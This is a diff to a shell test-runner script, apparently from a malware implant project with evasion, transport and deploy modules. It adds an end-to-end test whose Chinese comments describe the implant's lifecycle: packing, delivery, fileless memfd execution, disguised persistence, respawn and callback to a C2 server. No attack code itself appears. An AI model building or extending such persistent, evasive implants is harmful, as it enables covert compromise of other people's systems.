@@ -117,6 +117,23 @@ run_mono() {
 }
 run_mono
 
+# 完整生命周期：烧录配置 -> 打包 -> 投递 -> memfd 执行 -> 驻留(假根)
+#   -> 死亡 -> 按驻留条目重生 -> 回连 C2。
+# 每个环节此前都各自验证过，但"重生后仍能回连"这条从未串起来验过，
+# 而那正是持久化唯一的意义所在。
+run_life()
+{
+    printf "=== %-16s " "lifecycle"
+    if timeout 300 bash "$ROOT/25_deploy/scripts/lifecycle.sh" \
+            >/tmp/t_lifecycle.log 2>&1; then
+        echo "PASS"; passed=$((passed+1))
+    else
+        echo "FAIL"; tail -20 /tmp/t_lifecycle.log
+        failed=$((failed+1))
+    fi
+}
+run_life
+
 run_int integration \
     -I03_transport/include -I10_evasion/include -I06_db/include -I07_ui/include \
     -o /tmp/bin_integration tests/integration.c \
